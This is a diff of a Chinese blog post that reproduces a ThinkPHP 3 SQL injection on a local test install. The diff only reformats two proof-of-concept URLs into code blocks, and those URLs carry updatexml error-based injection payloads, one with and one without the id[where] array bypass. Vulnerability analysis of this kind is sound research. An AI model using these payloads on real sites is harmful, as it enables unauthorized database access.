@@ -12,7 +12,11 @@ thinkphp框架的漏洞还是相对好复现一点的，我个人觉得相关的
 关于建库建表的命令我就不说了，直接百度就有。
 
 ## 复现
-poc:http://localhost:8888/tp3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+poc:
+
+```
+http://localhost:8888/tp3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+```
 
 ![](http://tiaotiaolong.cn-bj.ufileos.com/blog19-02.jpg)
 
@@ -47,7 +51,10 @@ select里面又调用了parseSql。这个主要利用str_replace,是做替换用
 于是我还是很好奇这里为什么做的这么草草了事，难道是不应该在这里做安全检查吗。然后我仔细看了一下poc，发现这里的利用思路是使用php数组对非数组的情况进行绕过。
 比如我把这里的id中的[where]去掉，你会发现，根本就不是说没有做安全过滤。
 于是poc成了这样：
+
+```
 http://localhost:8888/tp3/index.php?m=Home&c=Index&a=test&id=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+```
 
 然后前面代码执行的过程基本没什么变化，等到了__parseOption()函数。
 ![](http://tiaotiaolong.cn-bj.ufileos.com/blog19-12.jpg)
